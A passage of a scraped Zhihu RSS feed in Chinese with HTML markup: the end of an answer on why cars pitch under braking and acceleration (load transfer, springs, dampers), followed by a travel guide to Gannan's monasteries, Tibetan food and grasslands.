data-pid=\"GXUshiwQ\"><b>可以看到：刹车时轴荷的转移：与减速度成正比，与重心高成正比，与轴距成反比。</b></p>\n<p data-pid=\"_u_wv7FD\">轴荷移多少定下来了，剩下就看弹簧有多硬了。<br>这简单，越硬就现象就越小嘛。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7229b29d9e36c8d504700495bbd475ba_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"745\" data-rawheight=\"314\" data-watermark=\"watermark\" data-original-src=\"v2-7229b29d9e36c8d504700495bbd475ba\" data-watermark-src=\"v2-80a4d66b574f27feb490d2431bcbe58c\" data-private-watermark-src=\"v2-32119c17a1a92de539978feb24022289\"></p>\n<p><br></p>\n<p data-pid=\"5-NN3U3z\"><i>但是太硬会导致轴荷没有过渡直接转移，严重的话会影响到车辆的动态失衡。</i><br><i>不过是另外一个范畴的事儿了，这里我们先不讨论</i></p>\n<p data-pid=\"Sb4RgOZX\">而为了舒适性，也不会把弹簧做得过于硬。<br>有些会做成刚度可变的弹簧，可以一定程度上抑制点头/抬头的现象。</p>\n<h3>除了多大，其实还有一个多久的问题</h3>\n<p data-pid=\"OyL891HN\">大小定了，其实还有时间长短的问题。<br>这其实就是点头/抬头运动向稳态收敛快慢的问题。</p>\n<p data-pid=\"br6ZRaeW\">这里就主要看减震器的能力：<br>能不能快速的扯住车身，在有限的几次运动中就解决战斗。</p>\n<p data-pid=\"UIOZA68z\">压缩行程中给弹簧兄弟多大的助力（又不添乱）<br>回弹行程中如何扯住一去不回头的弹簧兄弟（又不会扯得太紧）</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-68a486869be854f10834fdaf08177517_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"585\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-68a486869be854f10834fdaf08177517\" data-watermark-src=\"v2-2821c4df779ec328b997ff9d0fa401a6\" data-private-watermark-src=\"v2-2b2e15e628fd157f85b31a9af5ed3e01\"></p>\n<p><br></p>\n<h2>4.挪的不对会怎样<br>\n</h2>\n<p data-pid=\"-v9mkDPI\"><br>挪的不对其实就是：<b>太大又太久了。</b></p>\n<p data-pid=\"EMwTm9qu\"><b>太大：</b></p>\n<ul>\n<li data-pid=\"fTdte-N7\">抬头过于严重时：<br>对于前驱车会较难发挥全部的驱动力，而且这个时候很有可能会因为打滑而失去转向能力，会对车辆的可控性及动态稳定性产生影响。</li>\n<li data-pid=\"sv8tU-M9\">点头过于严重时：<br>后轮会减少摩擦力，从而减少整体制动力的输出；<br>极端情况下后轮会失去附着力而产生甩尾，同样对动态稳定性产生影响。</li>\n</ul>\n<p data-pid=\"dQklVa2i\"><b>太久：</b><br>倒还好一点，车子一直晃，不收敛，最直观的感受就是会晕车的。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5d5d1f8c2e9a2e044957710a254ae422_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"225\" data-watermark=\"watermark\" data-original-src=\"v2-5d5d1f8c2e9a2e044957710a254ae422\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"-UoYE7ZS\">那如何才能挪的对一点呢。<br>其实上面的公式里面已经有透露了，在加减速度不能受控的情况下。<br>我们可以通过降低重心，增加轴距来减轻轴荷的转移量。或者通过增加弹簧硬度来进一步的减小现象。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-74f8507b13b893bd830d6ca5f199eaa1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"681\" data-rawheight=\"243\" data-watermark=\"watermark\" data-original-src=\"v2-74f8507b13b893bd830d6ca5f199eaa1\" data-watermark-src=\"v2-5f571e13832902fcebbf54a0c3a4304d\" data-private-watermark-src=\"v2-1a3ccb675afec54ed206be767c2fb92a\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"1c0VDcii\"><b>只不过：</b></p>\n<ul>\n<li data-pid=\"agkyL-66\">重心位置：<br>可能是所有主机厂最想优化又最难优化的一个点</li>\n<li data-pid=\"oTWn09AG\">轴距：<br>车型lineup已定，相对难改</li>\n<li data-pid=\"jtD1pLqr\">弹簧硬度：<br>影响因素也多（舒适/操控/耐久）</li>\n</ul>\n<p data-pid=\"dzaprXC3\">这几个关键因素，都比较难简单直接的就优化的。</p>\n<p data-pid=\"GDJLG3bx\">但其实还是有一些方法的</p>\n<h2>5.所以，如果你还意犹未尽的话</h2>\n<p data-pid=\"_E8CdnfE\"><b>在汽车设计时、悬架设定时、是有相关的方法来一定程度上避免这些现象的。</b><br>学名叫“anti-geometry”，中文不知道怎么说。<br>相对来说会有那么一点偏学术一点，关于<b>Lift/Squat/Nose Up/Dive</b>分别如何解决。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfbf6cf49e34f4d6ce35d53784d8d028_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"469\" data-watermark=\"watermark\" data-original-src=\"v2-cfbf6cf49e34f4d6ce35d53784d8d028\" data-watermark-src=\"v2-f874b7bfd8f474ba7bf04d35116a8dec\" data-private-watermark-src=\"v2-669944e4abf01a2cd35ca7837a5ff9aa\"></p>\n<p><br></p>\n<p data-pid=\"QCAjW7UR\">如果大家感兴趣的话，我尝试消化消化再说给大家听听。<br><b>感兴趣的指标就是：在看，点赞，收藏，转发，一键三连啊。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lin-jian-chao-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小林</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21132322/answer/2366495819?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">40 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/19795306?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么赛车轮胎都很宽？</a><br><a href=\"http://www.zhihu.com/question/331826509?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">NASCAR赛车为什么没有夸张的空气动力套件？</a><br>\n","link":"http://www.zhihu.com/question/21132322/answer/2366495819?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"甘南有哪些比较有创意的旅行线路以及攻略？","date":"2022-02-28 03:36:14","description":"\n<p><img src=\"https://pic1.zhimg.com/v2-70187b1aab12a469fed0e2cd55bea51f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"187\" data-watermark=\"original\" data-original-src=\"v2-70187b1aab12a469fed0e2cd55bea51f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-18a0923075fda05bdeceefd077051ca9_720w.jpg?rss\" data-caption=\"©sccdmin/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-18a0923075fda05bdeceefd077051ca9\" data-watermark-src=\"v2-786770819c1cd514da64fe1ff43fe3ee\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"U6tXjGrj\">3月3日，<b>藏历新年</b>将正式到来，各种法会和节庆活动在<b>甘南</b>隆重举行。</p>\n<p data-pid=\"kSLhoqoQ\">从兰州到郎木寺，这是一条经典的朝圣之路，一路都是让背包客们向往的旅行地，用不着长途跋涉，也不受高原反应的困扰。<br></p>\n<p data-pid=\"VuizA5w6\">正好甘肃“丰收了·游甘肃”旅游惠民活动推出的优惠政策将会持续到3月31日，期间216个A级旅游景区全部免门票，<b>7处世界文化遗产</b>都有半价和套票的优惠。趁此机会，来这片独特的土地进行一场朝圣之旅吧！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-88d9df8a03a4106516bf929314f5b438_720w.jpg?rss\" data-caption=\"©枫寒慕竹/图虫创意\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-88d9df8a03a4106516bf929314f5b438\" data-watermark-src=\"v2-f7f725e2d00d350d3e7468971daf5565\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"H1ahopb5\">无论是闻名于世的宏大寺院，还是朴实无华的山间小庙，都沉淀着亘古不变的禅意。</p>\n<p data-pid=\"YTlfhZ0F\">——Lonely Planet《甘肃和宁夏》指南<br></p>\n<p><br></p>\n<p data-pid=\"kvVtvfUJ\"><b># 拉卜楞寺及周边 #</b><br></p>\n<p data-pid=\"LxBc74uc\">如果你想感受浓厚的宗教氛围，可以选择清晨早起，跟随僧侣信徒的脚步，转动每一个经筒，庞大的藏传佛教建筑群一定会让你心旷神怡。感受完<b>拉卜楞寺</b>的神圣庄严，你可以前往<b>草原深处</b>，骑马、射箭、过林卡都是不错的游览体验。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4577d3aaae3867a5e7b5857c3d7fbd5d_720w.jpg?rss\" data-caption=\"©观自在披萨/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-4577d3aaae3867a5e7b5857c3d7fbd5d\" data-watermark-src=\"v2-4840d066301289f355d91e692fc98316\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"vt7ehtT4\"><b>#拉卜楞寺</b></p>\n<p data-pid=\"ykvzGGEt\"><i>山川灵秀，瑞云缭绕</i></p>\n<p data-pid=\"wgckKpwE\">“拉卜楞”是藏语拉章的变音，意为活佛的居所。拉卜楞寺的大活佛即嘉木样。拉卜楞在整个藏区都有非常重要的地位，它与西藏的哲蚌寺、沙拉寺、甘丹寺、扎什伦布寺和青海的塔尔寺，并称<b>藏传佛教黄教格鲁派六大寺院</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a3a24a45fad44ede9cd2be7805149a05_720w.jpg?rss\" data-caption=\"©赵峰摄影/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-a3a24a45fad44ede9cd2be7805149a05\" data-watermark-src=\"v2-fb3c33c867b652738e212a9577402a02\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"9totFayt\">旺季的拉卜楞寺游人如织，但冬天更有一份佛门净地的神圣感。拉卜楞寺的节庆法会众多，其中以农历正月的<b>毛兰姆法会</b>最为隆重，众僧聚集于此，宏大庄严的法事场面，一定会给你留下记忆深刻的旅行体验。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-74627f8c3ba3884cdf572ac8e7b6dda5_720w.jpg?rss\" data-caption=\"©dashiyiyuan/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"737\" data-watermark=\"original\" data-original-src=\"v2-74627f8c3ba3884cdf572ac8e7b6dda5\" data-watermark-src=\"v2-a88dbe5aa9cc678db3683d5b0632f3fc\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"6pICROmt\"><b>闻思学院（大经堂）</b></p>\n<p data-pid=\"OeA74iCq\">闻思学院建于1710年，是拉卜楞寺的<b>首座学院</b>，有前殿楼、前庭院、正殿和后殿共数百间房屋，鼎盛时期曾有近四千人在这里修习显宗佛学。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6d4116746a18c9385e399e4d58d9ef21_720w.jpg?rss\" data-caption=\"©东方太白/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-6d4116746a18c9385e399e4d58d9ef21\" data-watermark-src=\"v2-f9818c0679add3eaac24d8665b57a90f\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"Ir9JkZbg\"><b>大金瓦殿（弥勒佛殿）</b></p>\n<p data-pid=\"bkYaFcNP\">大金瓦殿是拉卜楞寺<b>最高</b>的建筑，也是<b>规模最大</b>的佛殿。该殿整体色泽十分耀眼，屋顶覆盖的全是镏金铜瓦，屋脊上所装饰的铜狮、铜龙、铜宝瓶、铜如意和铜法轮，全是镏金的，传说当年建造的时候，殿顶每块瓦的价值为60头肥羊。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-55beee64952e1108fe2c4ab147163a62_720w.jpg?rss\" data-caption=\"©东方太白/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-55beee64952e1108fe2c4ab147163a62\" data-watermark-src=\"v2-fb656b0e5bac1e05bf41210293263820\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"VcGu2h0V\">殿门悬有嘉庆皇帝御赐，用汉、藏、满、蒙古文四种文字书写的<b>“寿禧寺”</b>匾额。</p>\n<p><br></p>\n<p data-pid=\"rgFJk5aS\"><b>贡唐宝塔</b></p>\n<p data-pid=\"bZOcahXO\">贡唐宝塔因位于贡唐仓活佛的院内而得名，建于<b>1805年</b>，但现存的宝塔系<b>1993年</b>重建。塔高五层，由塔刹、塔瓶、塔座三部分组成，一层的四周装有转经筒，可顺时针转上一圈再进塔参观。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2d6425ee69282e3d8d73bbc3506abd7d_720w.jpg?rss\" data-caption=\"©刀剑/图虫创意\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-2d6425ee69282e3d8d73bbc3506abd7d\" data-watermark-src=\"v2-f7b5f671e21afd216318353457007bb5\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"m-K9k5zW\"><b>酥油花馆</b></p>\n<p data-pid=\"l7GlGbix\">酥油花是藏传佛教艺术雕塑的一种特殊形式，使用的原料就是酥油，一般以佛教人物、花卉、飞禽、走兽、树木等事物为主题。殿内的酥油花有十几座，每年一换，酥油花往往在冬天制作，每年毛兰姆大法会期间，拉卜楞寺各学院之间会举行<b>酥油花比赛</b>，正月十五前后对外展出，五六月份天气转热后就无法保存，归于熔化。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-83c6b06f0c00a7e21b48f05dd8761d6b_720w.jpg?rss\" data-caption=\"©HANDLOVE/图虫创意\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-83c6b06f0c00a7e21b48f05dd8761d6b\" data-watermark-src=\"v2-e5723b239b49ed324c694ba7d8790ad0\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"J2aUlDgc\">在正月十五<b>“酥油灯花会”</b>结束后，精美的各式酥油花便被放置于此供世人参观，展馆中留下的只是其中很少的几件优胜作品。</p>\n<p><br></p>\n<p data-pid=\"uCXTk31R\"><b>#夏河</b></p>\n<p data-pid=\"SH5UcDRN\"><i>距离内地城市最近的藏区，藏元素一应俱全</i></p>\n<p data-pid=\"_VBcDloK\">夏河县城围寺而城，形状像一个东北-西南走向的海螺，依群山傍大夏河。夏河县城和拉卜楞寺仅隔一座小桥，横跨拉卜楞寺外围的排水沟，当地人称河沟上的桥为<b>“俗僧桥”</b>。现在的夏河则更像是一个为拉卜楞的朝圣者和游客准备的县城。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2bbdb4c8ecae329d94e5e62afacc2c5e_720w.jpg?rss\" data-caption=\"©一路无话118/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-2bbdb4c8ecae329d94e5e62afacc2c5e\" data-watermark-src=\"v2-82caf25eead7ae6a4f4e85fe02caba5f\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"NFG_X2Pf\">夏河县城的景点不多，如果有时间，你可以去看看几个有意思的宗教建筑。位于<b>柔扎广场</b>（文化广场）的<b>夏河县关帝庙</b>，是到夏河经商的陕西、北京同乡会在清末时修建的，内供文圣、武神排位。除关帝庙外，夏河县城里还有一座规模不算小的<b>夏河清真寺</b>原建于1893年，为回族商人所建。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc8e72e6ffc573656bdb18208cf6392c_720w.jpg?rss\" data-caption=\"©快递老哥/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-cc8e72e6ffc573656bdb18208cf6392c\" data-watermark-src=\"v2-3e9260219efda4be1977cce341ebdc80\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"crBXx_8c\">除了藏区流行的川菜馆和火锅，一些藏式餐厅也有结合川、甘两省风味的<b>藏餐</b>，如藏式火锅、蕨麻米饭、糌粑、牦牛肉炒饭等。夏河还有很多家<b>西式咖啡馆</b>，同时也卖简餐和酒水，<b>雪山客栈</b>有正宗的<b>尼泊尔餐</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-19e4d184fa7521b06c76ca0e6fd542f5_720w.jpg?rss\" data-caption=\"©吃货羽沫旅行记/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-19e4d184fa7521b06c76ca0e6fd542f5\" data-watermark-src=\"v2-ed5aef2ae3defd7ebbe4ae275321907c\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"dDlhsssb\"><b>· 藏式小食 ·</b></p>\n<p data-pid=\"mrYEeK4k\">川菜和火锅已日益成为甘南人的上选，西餐、尼泊尔餐偶尔也不难吃到，如果你想尝试一下在餐馆里吃藏餐，往往只有小吃最正宗。</p>\n<p data-pid=\"u7SN6Uv7\"><b>&gt;糌粑</b> 方便携带、吃法简单的糌粑是藏族牧民的传统主食，用青稞或豌豆炒熟后磨成面粉，与酥油拌和后捏成团状，味淡微甜。食用时搭配酥油茶或奶茶更容易下咽，且味道更佳。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-305be5a2d57454fe85ad50a6c6ae94c1_720w.jpg?rss\" data-caption=\"由张张要发发提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"original\" data-original-src=\"v2-305be5a2d57454fe85ad50a6c6ae94c1\" data-watermark-src=\"v2-4d7649bf4bdff6c95527331e9d7c766d\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"IYtnloPs\"><b>&gt;蕨麻米饭</b> 蕨麻俗称“人参果”，是甘南地区特产，营养价值较高。蕨麻米饭是在米饭上盖上蕨麻、撒上白糖、淋上酥油汁，搅拌后食用。口感较甜，不喜甜者可能吃不惯。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8cef84bd10221ea9ad4f6b2c300aa477_720w.jpg?rss\" data-caption=\"由Jane今天有没有开开心心提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-8cef84bd10221ea9ad4f6b2c300aa477\" data-watermark-src=\"v2-f03dea5def69622fc06b04be72d7d442\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"L_pg1zRh\"><b>&gt;藏包</b> 藏包用青稞面为皮、用牛羊肉做馅蒸制而成。刚出锅的包子外皮雪亮，肉馅清晰可见。一定要趁热吃，切忌吃凉的包子，因为牛羊肉馅凉了牛羊油就会凝固，吃了会引起不适。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-5acf4f0af82df24c60d505790c9ea6d9_720w.jpg?rss\" data-caption=\"由张张要发发提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"original\" data-original-src=\"v2-5acf4f0af82df24c60d505790c9ea6d9\" data-watermark-src=\"v2-e47dd61c3db84e425b881d373f1bddf5\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"oTBkCXqb\"><b>&gt;奶渣（曲拉）</b> 提炼酥油的副产品，是牛奶中蛋白质等营养物质的沉淀，晒干后呈白色颗粒状，常作为藏餐甜品的辅料，咬起来如石子一般嘎嘣作响。 </p>\n<p><img src=\"https://pic2.zhimg.com/v2-21309f192e69d60f5114d306e71c3819_720w.jpg?rss\" data-caption=\"由废肺子提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1375\" data-watermark=\"original\" data-original-src=\"v2-21309f192e69d60f5114d306e71c3819\" data-watermark-src=\"v2-0b5baec5f8f1f9db5715f48646f518e2\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"50jKlZPB\"><b>&gt;酸奶</b> 提炼完酥油后，把牛奶煮沸，放入一点点前些天的酸奶，放置冷却后，第二天早晨就制成了新鲜酸奶。口感极酸，一定要加入白糖拌着才好吃。5月初人们刚刚开始挤牛奶，用来制酸奶的牛奶往往没有被事先提炼过酥油，做出来的酸奶口感最好。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7715d672e978e351a73ed5638d87966b_720w.jpg?rss\" data-caption=\"由胃病酒罐子提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-7715d672e978e351a73ed5638d87966b\" data-watermark-src=\"v2-93b53e8200456c4e2a685fbdc8f10c09\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"EXjVXCA-\"><b>#桑科草原</b></p>\n<p data-pid=\"ub1646i_\"><i>成熟的度假区与多样旅行体验</i></p>\n<p data-pid=\"orS30_RZ\">桑科草原是甘南最早成名的草原，开发比较成熟，景区内的草原被围起来，成了一个个度假村。从县城往桑科草原方向，出城约8公里处有一个<b>桑科湿地公园观景台</b>，湿地有新修的观景栈道。过<b>桑科乡</b>继续往前，路的两侧都是“牧家乐”，除了住宿，还可以骑马、穿藏装照相、购买纪念品。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-62835d39d507447a74e31be9302d65c0_720w.jpg?rss\" data-caption=\"©健忘的行摄世界/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-62835d39d507447a74e31be9302d65c0\" data-watermark-src=\"v2-2e0975a6fb07b1019976a44801c9b791\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"ce0Gc227\">如果想体验更纯粹的草原风光，从桑科乡右拐，继续沿<b>S312省道</b>行驶，过桑科大桥不久有一个<b>桑科琼泽滩观景台</b>，继续行驶9公里是<b>诺尔丹营地</b>，沿途也有很多帐篷酒店。再继续走几十公里到草原深处，才算是到了桑科草原的精华部分，有一些徒步探险路线从这里出发，具体可以咨询<b>夏河雪山客栈</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1c49b14276548cbe009fb0be8c79f658_720w.jpg?rss\" data-caption=\"©健忘的行摄世界/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-1c49b14276548cbe009fb0be8c79f658\" data-watermark-src=\"v2-63fe2351aebf774fa7176079c808ac9a\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"n6C1VtRv\"><b>诺尔丹营地</b></p>\n<p data-pid=\"tqFBjbhK\">位于桑科草原深处，由诺乐工坊的老板投资，颇受西方游客的青睐。一年中仅<b>5月至10月</b>开放，满房率依然很高。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-927bb38a3f24e0417a09d7ee29b8f430_720w.jpg?rss\" data-caption=\"©时间博物馆映像工作室/图虫创意\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-927bb38a3f24e0417a09d7ee29b8f430\" data-watermark-src=\"v2-a5df342762b7eedd82d85ae9f8023f42\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"zYWC9bG7\">营地位于草原上弯曲的小河旁，房间之间是灌木丛，利用了自然区域作空间分割。营地有混合<b>北欧和藏式风格</b>的木屋餐厅、帐篷餐厅、酒吧、桑拿房、公用浴室，客房是木制家具搭配诺乐的牦牛绒制品，以自然采光为主，炉火取暖，卫生间采用环保的传统水缸和取土填埋清洁。可网上预订，住宿价格含三餐，主厨是<b>原米其林三星餐厅厨师</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-04707660986e3f717d721611940c309b_720w.jpg?rss\" data-caption=\"©山上春树君/图虫创意\" data-size=\"normal\" data-rawwidth=\"932\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-04707660986e3f717d721611940c309b\" data-watermark-src=\"v2-f6a66d0d354838b113ed9b4e5dd65eb5\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"EM_afyrO\"><b>#甘加草原</b></p>\n<p data-pid=\"s_ie7PyH\"><i>这里有更原始纯粹的自然风光</i></p>\n<p data-pid=\"BJD5fM-O\">在广袤的甘加大地上，<b>白石崖</b>作为一道长达15公里的天然屏风，将甘加草原垂直分割成落差1000米的两个高山草原。甘加草原有着比夏河桑科草原更为原始的自然风光，在那里可以遇见牧民散养的成群牛羊，辽阔草原一望无际。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c05021b1b6bcfc165677852bf8dc7e2d_720w.jpg?rss\" data-caption=\"©云风0518/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"715\" data-watermark=\"original\" data-original-src=\"v2-c05021b1b6bcfc165677852bf8dc7e2d\" data-watermark-src=\"v2-885930bbb3581625cb2a4394023a7a80\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"elGfqZHi\"><b>白石崖溶洞</b></p>\n<p data-pid=\"PkQNoqOG\">白石崖溶洞是藏区几个著名的<b>修行洞</b>之一，胜乐本尊之圣地。8世纪由<b>莲花生大师</b>亲自开启，历代嘉木样大师、贡唐仓活佛都曾到此修行弘法，十世班禅大师也曾亲临洞中修行，洞口现在还供奉有他的法相。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-61d39dfd6cb532a092a08b5f52be397a_720w.jpg?rss\" data-caption=\"由馨贻/Cindy提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"original\" data-original-src=\"v2-61d39dfd6cb532a092a08b5f52be397a\" data-watermark-src=\"v2-26fa113be3d3eaf6ef91067a5e0e675f\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-11725d7038013d8f7c2845307672d20c_720w.jpg?rss\" data-caption=\"由馨贻/Cindy提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"original\" data-original-src=\"v2-11725d7038013d8f7c2845307672d20c\" data-watermark-src=\"v2-dd8b30dfa3c5932202eef5b098bc2bb6\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"L4zIyTA5\">溶洞中的黑暗世界是探险者的乐园，但并不适合所有的观光客，如果有幽闭恐惧症，最好不要入内。溶洞内部非常原始，洞中的路湿滑、崎岖、落差大，仅有两边的绳索保护安全，需要手脚并用匍匐前进，建议你穿不怕被弄脏的<b>户外衣物</b>，不要带任何不必要的物品，同时也要<b>注意保暖</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c7aeb9db68690f88e3de7cbbf87043c5_720w.jpg?rss\" data-caption=\"由WAJunL_提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"763\" data-watermark=\"original\" data-original-src=\"v2-c7aeb9db68690f88e3de7cbbf87043c5\" data-watermark-src=\"v2-f544cbad167bddfe3aa8978c8aba12be\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"LhI33o7L\"><b>白石崖寺</b></p>\n<p data-pid=\"PWaEIVsr\">从白石崖溶洞（圣洞）出来以后，径直往前，约<b>1.5公里</b>后便是白石崖寺。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8d5a6fce8c6d76b22043e9f9e6ba72d4_720w.jpg?rss\" data-caption=\"由枉顾提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-8d5a6fce8c6d76b22043e9f9e6ba72d4\" data-watermark-src=\"v2-fc7fb1766e07cc2b28683d0f3265d159\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"oGDh_1Iu\">白石崖寺初创于14世纪，1705年，由<b>甘加班志达</b>重建，后为拉卜楞寺属寺。白石崖寺现有一百余名僧人，建筑不多，氛围十分古朴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a697f056057253716af76b08aa203553_720w.jpg?rss\" data-caption=\"由枉顾提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-a697f056057253716af76b08aa203553\" data-watermark-src=\"v2-bfb9371fb36613d8fdfba9f6bb8cbe35\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5beebb712544fdf8fff582377923a8f8_720w.jpg?rss\" data-caption=\"由枉顾提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-5beebb712544fdf8fff582377923a8f8\" data-watermark-src=\"v2-9faab25606d11bec06fe818fe17dea0a\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"bGnO-FYO\"><b>八角城</b>八角城背靠白石崖，下面是蜿蜒在草原上的河流，沿峡谷而筑。始建于<b>汉代</b>，曾是甘肃、青海之间的交通要塞，也是历代甘南占领者激烈争夺的军事重镇。</p>\n<p><img 